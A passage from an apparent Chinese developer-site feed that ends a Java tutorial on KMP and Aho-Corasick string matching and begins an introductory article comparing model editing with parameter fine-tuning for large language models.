        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 未找到匹配</span>
    }
    
    <span class="hljs-comment">// 使用示例</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-type">String</span> text = <span class="hljs-string">"ABABDABACDABABCABAB"</span>;
        <span class="hljs-type">String</span> pattern = <span class="hljs-string">"ABABCABAB"</span>;
        
        <span class="hljs-type">int</span> position = <span class="hljs-built_in">naiveSearch</span>(text, pattern);
        
        <span class="hljs-keyword">if</span> (position == <span class="hljs-number">-1</span>) {
            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"未找到匹配"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"模式串在位置 "</span> + position + <span class="hljs-string">" 处匹配"</span>);
        }
    }
}
</code></pre>
<p>上述实现暴力枚举所有可能的匹配位置，逐一比较文本串与模式串的每个字符，直到找到完全匹配或确定不存在匹配</p>
<h4 data-id="heading-26">KMP算法的实现</h4>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class KMP {
    // 构建部分匹配表（next数组）
    private static int<span class="hljs-section">[]</span> buildNext(String pattern) {
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = new int[m]<span class="hljs-comment">;</span>
        next<span class="hljs-section">[0]</span> = 0<span class="hljs-comment">; // 第一个字符的最长相等前后缀长度为0</span>
        
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m; i++) {</span>
            // 当前字符不匹配，回退j
            while (j &gt; 0 &amp;&amp; pattern.charAt(i) != pattern.charAt(j)) {
                <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
            }
            
            // 当前字符匹配，j向前移动
            if (pattern.charAt(i) == pattern.charAt(j)) {
                j++<span class="hljs-comment">;</span>
            }
            
            // 记录当前位置的最长相等前后缀长度
            next<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
        }
        
        return next<span class="hljs-comment">;</span>
    }
    
    // KMP搜索算法
    public static int kmpSearch(String text, String pattern) {
        if (<span class="hljs-attr">pattern</span> == null || pattern.length() == <span class="hljs-number">0</span>) {
            return 0<span class="hljs-comment">;</span>
        }
        
        if (<span class="hljs-attr">text</span> == null || text.length() &lt; pattern.length()) {
            return -1<span class="hljs-comment">;</span>
        }
        
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 构建next数组
        int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = buildNext(pattern)<span class="hljs-comment">;</span>
        
        // 进行匹配
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; n; i++) {</span>
            // 当前字符不匹配，根据next数组回退j
            while (j &gt; 0 &amp;&amp; text.charAt(i) != pattern.charAt(j)) {
                <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
            }
            
            // 当前字符匹配，j向前移动
            if (text.charAt(i) == pattern.charAt(j)) {
                j++<span class="hljs-comment">;</span>
            }
            
            // 完全匹配，返回起始索引
            if (<span class="hljs-attr">j</span> == m) {
                return i - m + 1<span class="hljs-comment">;</span>
            }
        }
        
        return -1<span class="hljs-comment">; // 未找到匹配</span>
    }
    
    // 查找所有匹配位置
    public static List&lt;Integer&gt; kmpSearchAll(String text, String pattern) {
        List&lt;Integer&gt; <span class="hljs-attr">positions</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">pattern</span> == null || pattern.length() == <span class="hljs-number">0</span>) {
            return positions<span class="hljs-comment">;</span>
        }
        
        if (<span class="hljs-attr">text</span> == null || text.length() &lt; pattern.length()) {
            return positions<span class="hljs-comment">;</span>
        }
        
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 构建next数组
        int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = buildNext(pattern)<span class="hljs-comment">;</span>
        
        // 进行匹配
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; n; i++) {</span>
            // 当前字符不匹配，回退j
            while (j &gt; 0 &amp;&amp; text.charAt(i) != pattern.charAt(j)) {
                <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
            }
            
            // 当前字符匹配，j向前移动
            if (text.charAt(i) == pattern.charAt(j)) {
                j++<span class="hljs-comment">;</span>
            }
            
            // 完全匹配，记录位置并继续匹配
            if (<span class="hljs-attr">j</span> == m) {
                positions.add(i - m + 1)<span class="hljs-comment">;</span>
                // 回退j以寻找下一个匹配
                <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
            }
        }
        
        return positions<span class="hljs-comment">;</span>
    }
    
    public static void main(String<span class="hljs-section">[]</span> args) {
        String <span class="hljs-attr">text</span> = <span class="hljs-string">"ABABDABACDABABCABAB"</span><span class="hljs-comment">;</span>
        String <span class="hljs-attr">pattern</span> = <span class="hljs-string">"ABABCABAB"</span><span class="hljs-comment">;</span>
        
        int <span class="hljs-attr">pos</span> = kmpSearch(text, pattern)<span class="hljs-comment">;</span>
        List&lt;Integer&gt; <span class="hljs-attr">allPos</span> = kmpSearchAll(text, pattern)<span class="hljs-comment">;</span>
        
        System.out.println("文本: " + text)<span class="hljs-comment">;</span>
        System.out.println("模式: " + pattern)<span class="hljs-comment">;</span>
        System.out.println("首次匹配位置: " + (pos != -1 ? pos : "未找到"))<span class="hljs-comment">;</span>
        System.out.println("所有匹配位置: " + allPos)<span class="hljs-comment">;</span>
        
        // 打印next数组，帮助理解
        int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = buildNext(pattern)<span class="hljs-comment">;</span>
        System.out.print("next数组: ")<span class="hljs-comment">;</span>
        for (int val : next) {
            System.out.print(val + " ")<span class="hljs-comment">;</span>
        }
        System.out.println()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>在上述代码中：</p>
<p>java</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 当前字符不匹配，回退j</span>
<span class="hljs-selector-tag">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; text.<span class="hljs-built_in">charAt</span>(i) != pattern.<span class="hljs-built_in">charAt</span>(j)) {
    <span class="hljs-selector-tag">j</span> = <span class="hljs-selector-tag">next</span><span class="hljs-selector-attr">[j - 1]</span>;
}
</code></pre>
<p>是 KMP 算法的核心，在匹配失败时根据预先计算的next数组来确定模式串指针的回退位置。</p>
<h3 data-id="heading-27">优化</h3>
<p>优化后的 next 数组</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// 优化next数组，避免匹配失败后回退到同样会失败的位置
private static int<span class="hljs-section">[]</span> buildOptimizedNext(String pattern) {
    int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
    int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = new int[m]<span class="hljs-comment">;</span>
    next<span class="hljs-section">[0]</span> = 0<span class="hljs-comment">;</span>
    
    for (int <span class="hljs-attr">i</span> = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m; i++) {</span>
        while (j &gt; 0 &amp;&amp; pattern.charAt(i) != pattern.charAt(j)) {
            <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
        }
        
        if (pattern.charAt(i) == pattern.charAt(j)) {
            j++<span class="hljs-comment">;</span>
        }
        
        // 当前位置匹配失败时，如果回退位置的字符与当前位置相同，则继续回退
        if (i + 1 &lt; m &amp;&amp; pattern.charAt(i + 1) == pattern.charAt(j)) {
            next<span class="hljs-section">[i]</span> = next<span class="hljs-section">[j - 1]</span><span class="hljs-comment">;</span>
        } else {
            next<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
        }
    }
    
    return next<span class="hljs-comment">;</span>
}
</code></pre>
<p>预处理减少分支实现</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// 预处理字符映射，减少字符比较的分支
public static int kmpSearchOptimized(String text, String pattern) {
    if (<span class="hljs-attr">pattern</span> == null || pattern.length() == <span class="hljs-number">0</span>) {
        return 0<span class="hljs-comment">;</span>
    }
    
    if (<span class="hljs-attr">text</span> == null || text.length() &lt; pattern.length()) {
        return -1<span class="hljs-comment">;</span>
    }
    
    int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
    int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
    
    // 使用数组映射来加速字符比较（假设字符集为ASCII）
    // 为每个模式字符的每个位置创建一个状态转移表
    int<span class="hljs-section">[]</span><span class="hljs-section">[]</span> <span class="hljs-attr">dfa</span> = new int[<span class="hljs-number">256</span>][m]<span class="hljs-comment">;</span>
    
    // 初始化第一个字符的DFA
    dfa<span class="hljs-section">[pattern.charAt(0)]</span><span class="hljs-section">[0]</span> = 1<span class="hljs-comment">;</span>
    
    for (int <span class="hljs-attr">X</span> = <span class="hljs-number">0</span>, j = <span class="hljs-number">1</span><span class="hljs-comment">; j &lt; m; j++) {</span>
        // 复制匹配失败情况下的值
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; 256; c++) {</span>
            dfa<span class="hljs-section">[c]</span><span class="hljs-section">[j]</span> = dfa<span class="hljs-section">[c]</span><span class="hljs-section">[X]</span><span class="hljs-comment">;</span>
        }
        // 设置匹配成功情况下的值
        dfa<span class="hljs-section">[pattern.charAt(j)]</span><span class="hljs-section">[j]</span> = j + 1<span class="hljs-comment">;</span>
        // 更新重启状态
        <span class="hljs-attr">X</span> = dfa[pattern.charAt(j)][X]<span class="hljs-comment">;</span>
    }
    
    // 模式匹配
    int i, j<span class="hljs-comment">;</span>
    for (<span class="hljs-attr">i</span> = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; n &amp;&amp; j &lt; m; i++) {</span>
        <span class="hljs-attr">j</span> = dfa[text.charAt(i)][j]<span class="hljs-comment">;</span>
    }
    
    if (<span class="hljs-attr">j</span> == m) {
        return i - m<span class="hljs-comment">; // 找到匹配</span>
    } else {
        return -1<span class="hljs-comment">;    // 未找到匹配</span>
    }
}
</code></pre>
<h3 data-id="heading-28">优点</h3>
<ul>
<li>时间复杂度为O(m+n)，优于朴素的字符串匹配算法(暴力解法)</li>
<li>文本串只需扫描一次，不会回退</li>
<li>对于包含重复模式的字符串会高效</li>
<li>预处理模式串，可以多次用于不同的文本串</li>
<li>能快速跳过已知不会匹配的位置</li>
</ul>
<h3 data-id="heading-29">缺点</h3>
<ul>
<li>需要额外的空间存储next数组</li>
<li>构建next数组的逻辑较为复杂，不易理解</li>
<li>在模式串较短或无重复模式时，相比简单算法优势不明显</li>
<li>实现时容易出错，特别是处理边界情况</li>
</ul>
<h3 data-id="heading-30">应用场景</h3>
<p>1）生物信息学中的DNA序列匹配<br/>
2）网络入侵检测系统中的模式匹配<br/>
3）搜索引擎的关键词匹配<br/>
4）数据压缩算法中的模式识别</p>
<h3 data-id="heading-31">扩展：多模式字符串匹配</h3>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// Aho-Corasick算法 - KMP的多模式扩展
public static class AhoCorasick {
    static class TrieNode {
        TrieNode<span class="hljs-section">[]</span> <span class="hljs-attr">children</span> = new TrieNode[<span class="hljs-number">256</span>]<span class="hljs-comment">;</span>
        TrieNode fail<span class="hljs-comment">;</span>
        List&lt;Integer&gt; <span class="hljs-attr">patternIndices</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
        
        public TrieNode() {
            <span class="hljs-attr">fail</span> = null<span class="hljs-comment">;</span>
        }
    }
    
    private TrieNode root<span class="hljs-comment">;</span>
    private String<span class="hljs-section">[]</span> patterns<span class="hljs-comment">;</span>
    
    public AhoCorasick(String<span class="hljs-section">[]</span> patterns) {
        <span class="hljs-attr">this.patterns</span> = patterns<span class="hljs-comment">;</span>
        buildTrie()<span class="hljs-comment">;</span>
        buildFailureLinks()<span class="hljs-comment">;</span>
    }
    
    private void buildTrie() {
        <span class="hljs-attr">root</span> = new TrieNode()<span class="hljs-comment">;</span>
        
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; patterns.length; i++) {</span>
            String <span class="hljs-attr">pattern</span> = patterns[i]<span class="hljs-comment">;</span>
            TrieNode <span class="hljs-attr">node</span> = root<span class="hljs-comment">;</span>
            
            for (char c : pattern.toCharArray()) {
                if (node.children<span class="hljs-section">[c]</span> == null) {
                    node.children<span class="hljs-section">[c]</span> = new TrieNode()<span class="hljs-comment">;</span>
                }
                <span class="hljs-attr">node</span> = node.children[c]<span class="hljs-comment">;</span>
            }
            
            node.patternIndices.add(i)<span class="hljs-comment">;</span>
        }
    }
    
    private void buildFailureLinks() {
        Queue&lt;TrieNode&gt; <span class="hljs-attr">queue</span> = new LinkedList&lt;&gt;()<span class="hljs-comment">;</span>
        
        // 初始化根节点的子节点
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 256; i++) {</span>
            if (root.children<span class="hljs-section">[i]</span> != null) {
                root.children<span class="hljs-section">[i]</span>.<span class="hljs-attr">fail</span> = root<span class="hljs-comment">;</span>
                queue.offer(root.children<span class="hljs-section">[i]</span>)<span class="hljs-comment">;</span>
            } else {
                root.children<span class="hljs-section">[i]</span> = root<span class="hljs-comment">;</span>
            }
        }
        
        // BFS构建失败链接
        while (!queue.isEmpty()) {
            TrieNode <span class="hljs-attr">node</span> = queue.poll()<span class="hljs-comment">;</span>
            
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 256; i++) {</span>
                if (node.children<span class="hljs-section">[i]</span> != null) {
                    TrieNode <span class="hljs-attr">failNode</span> = node.fail<span class="hljs-comment">;</span>
                    
                    while (failNode != root &amp;&amp; failNode.children<span class="hljs-section">[i]</span> == null) {
                        <span class="hljs-attr">failNode</span> = failNode.fail<span class="hljs-comment">;</span>
                    }
                    
                    <span class="hljs-attr">failNode</span> = failNode.children[i]<span class="hljs-comment">;</span>
                    node.children<span class="hljs-section">[i]</span>.<span class="hljs-attr">fail</span> = failNode<span class="hljs-comment">;</span>
                    
                    // 合并匹配结果
                    node.children<span class="hljs-section">[i]</span>.patternIndices.addAll(failNode.patternIndices)<span class="hljs-comment">;</span>
                    
                    queue.offer(node.children<span class="hljs-section">[i]</span>)<span class="hljs-comment">;</span>
                }
            }
        }
    }
    
    public List&lt;Pair&lt;Integer, Integer&gt;&gt; search(String text) {
        List&lt;Pair&lt;Integer, Integer&gt;&gt; <span class="hljs-attr">results</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
        TrieNode <span class="hljs-attr">currentState</span> = root<span class="hljs-comment">;</span>
        
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; text.length(); i++) {</span>
            char <span class="hljs-attr">c</span> = text.charAt(i)<span class="hljs-comment">;</span>
            
            while (currentState != root &amp;&amp; currentState.children<span class="hljs-section">[c]</span> == null) {
                <span class="hljs-attr">currentState</span> = currentState.fail<span class="hljs-comment">;</span>
            }
            
            <span class="hljs-attr">currentState</span> = currentState.children[c]<span class="hljs-comment">;</span>
            
            for (int patternIndex : currentState.patternIndices) {
                int <span class="hljs-attr">endPos</span> = i<span class="hljs-comment">;</span>
                int <span class="hljs-attr">startPos</span> = endPos - patterns[patternIndex].length() + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
                results.add(new Pair&lt;&gt;(patternIndex, startPos))<span class="hljs-comment">;</span>
            }
        }
        
        return results<span class="hljs-comment">;</span>
    }
    
    static class Pair&lt;K, V&gt; {
        K first<span class="hljs-comment">;</span>
        V second<span class="hljs-comment">;</span>
        
        public Pair(K first, V second) {
            <span class="hljs-attr">this.first</span> = first<span class="hljs-comment">;</span>
            <span class="hljs-attr">this.second</span> = second<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-32">相关的 LeetCode 热门题目</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Ffind-the-index-of-the-first-occurrence-in-a-string%2F" target="_blank" title="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/" ref="nofollow noopener noreferrer">28. 找出字符串中第一个匹配项的下标</a> - 标准的字符串匹配问题</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fshortest-palindrome%2F" target="_blank" title="https://leetcode.cn/problems/shortest-palindrome/" ref="nofollow noopener noreferrer">214. 最短回文串</a> - 可以使用KMP算法的next数组思想解决</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Frepeated-substring-pattern%2F" target="_blank" title="https://leetcode.cn/problems/repeated-substring-pattern/" ref="nofollow noopener noreferrer">459. 重复的子字符串</a> - 使用KMP的next数组判断字符串是否由重复子串构成</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-happy-prefix%2F" target="_blank" title="https://leetcode.cn/problems/longest-happy-prefix/" ref="nofollow noopener noreferrer">1392. 最长快乐前缀</a></li>
</ul>
<p>KMP算法是字符串处理中的经典算法，用来解决字符串匹配问题，理解它对提升算法设计能力还是很有帮助的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[模型编辑 vs 参数微调：给零算法基础AI从业者的讲解]]></title>    <link>https://juejin.cn/post/7584013833993895970</link>    <guid>https://juejin.cn/post/7584013833993895970</guid>    <pubDate>2025-12-16T07:16:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584013833993895970" data-draft-id="7584043969687273524" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="模型编辑 vs 参数微调：给零算法基础AI从业者的讲解"/> <meta itemprop="keywords" content="OpenAI,AIGC,AI编程"/> <meta itemprop="datePublished" content="2025-12-16T07:16:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="树獭叔叔"/> <meta itemprop="url" content="https://juejin.cn/user/3734382051604446"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            模型编辑 vs 参数微调：给零算法基础AI从业者的讲解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3734382051604446/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    树獭叔叔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:16:32.000Z" title="Tue Dec 16 2025 07:16:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>这是一篇<strong>面向无算法背景读者</strong>的讲解文章。<br/>
目标不是讲公式，而是讲清楚：<strong>它们在“想解决什么问题、用什么方式、什么时候该用谁”上的根本差异</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、先给一句话结论（先有整体感）</h2>
<ul>
<li>
<p><strong>参数微调（Fine-tuning）</strong> ：</p>
<blockquote>
<p>通过训练，让模型<strong>整体慢慢学会一类新能力或新风格</strong>。</p>
</blockquote>
</li>
<li>
<p><strong>模型编辑（Model Editing）</strong> ：</p>
<blockquote>
<p>不重新训练模型，只是<strong>精确地改掉模型里“某一句已经学错或过时的知识”</strong> 。</p>
</blockquote>
</li>
</ul>
<p>如果你只记住一句话：</p>
<blockquote>
<p><strong>参数微调 = 再学习一门课</strong><br/>
<strong>模型编辑 = 改教科书里的一句话</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、为什么会有这两种方法？</h2>
<h3 data-id="heading-2">1️⃣ 大模型是怎么“学会东西”的？</h3>
<p>大模型在预训练时：</p>
<ul>
<li>看了<strong>海量数据</strong></li>
<li>用**训练（loss + 反向传播）**的方式</li>
<li>把知识“分散地”存进大量参数里</li>
</ul>
<p>结果是：</p>
<ul>
<li>能力很强</li>
<li>但<strong>具体知识并没有明确存在哪一行</strong></li>
</ul>
<p>这带来两个现实问题：</p>
<hr/>
<h3 data-id="heading-3">2️⃣ 现实中的两类修改需求</h3>
<h4 data-id="heading-4">场景 A：</h4>
<blockquote>
<p>“我想让模型<strong>整体更擅长某类任务</strong>”</p>
</blockquote>
<p>比如：</p>
<ul>
<li>更懂医疗文本</li>
<li>更像客服语气</li>
<li>更擅长写代码</li>
</ul>
<p>👉 这是<strong>分布级变化</strong><br/>
👉 适合：<strong>参数微调</strong></p>
<hr/>
<h4 data-id="heading-5">场景 B：</h4>
<blockquote>
<p>“模型只有<strong>某个具体事实是错的</strong>”</p>
</blockquote>
<p>比如：</p>
<ul>
<li>某公司 CEO 变了</li>
<li>某政策更新了</li>
<li>某个人物关系说错了</li>
</ul>
<p>👉 这是<strong>点状知识错误</strong><br/>
👉 适合：<strong>模型编辑</strong></p>
<hr/>
<h2 data-id="heading-6">三、什么是参数微调（Fine-tuning）？</h2>
<h3 data-id="heading-7">1️⃣ 用一句最通俗的话说</h3>
<blockquote>
<p><strong>参数微调 = 用新数据，再训练模型一段时间</strong></p>
</blockquote>
<p>它的流程和你直觉中的“训练模型”几乎一样。</p>
<hr/>
<h3 data-id="heading-8">2️⃣ 参数微调是怎么工作的？（不讲公式版）</h3>
<p>流程大致是：</p>
<ol>
<li>准备一批数据（输入 + 标准答案）</li>
<li>模型给出预测结果</li>
<li>和标准答案做对比，算一个“错了多少”的分数（loss）</li>
<li>模型根据这个分数，<strong>一点点调整参数</strong></li>
<li>重复很多次，直到整体表现变好</li>
</ol>
<p>关键点：</p>
<ul>
<li>❗ <strong>是“整体慢慢变好”</strong></li>
<li>❗ <strong>追求平均意义上的正确</strong></li>
</ul>
<hr/>
<h3 data-id="heading-9">3️⃣ 参数微调一定会改所有参数吗？</h3>
<p><strong>不一定，这一点非常重要。</strong></p>
<p>参数微调 ≠ 一定全量更新参数。</p>
<p>从工程实现上，常见三大类：</p>
<hr/>
<h3 data-id="heading-10">（1）只训练原模型的一部分参数</h3>
<ul>
<li>
<p>冻结大多数层</p>
</li>
<li>
<p>只训练：</p>
<ul>
<li>后几层</li>
<li>某些子模块</li>
</ul>
</li>
</ul>
<p>特点：</p>
<ul>
<li>改动相对温和</li>
<li>但仍然属于“再训练”</li>
</ul>
<hr/>
<h3 data-id="heading-11">（2）不动原模型，增加新参数（在原始模型基础上，加一层神经网络）</h3>
<p>代表方法：</p>
<ul>
<li>LoRA / QLoRA</li>
<li>Adapter</li>
</ul>
<p>直观理解：</p>
<ul>
<li>原模型参数完全冻结</li>
<li>旁边加一个“小补丁”</li>
<li>训练的只是这个补丁</li>
</ul>
<p>但本质仍然是：</p>
<ul>
<li>有训练数据</li>
<li>有 loss</li>
<li>多步训练</li>
</ul>
<p>👉 <strong>所以它们依然是参数微调</strong></p>
<hr/>
<h3 data-id="heading-12">（3）只在“输入侧”增加参数（加一层神经网络处理input）</h3>
<p>代表方法：</p>
<ul>
<li>Prompt Tuning</li>
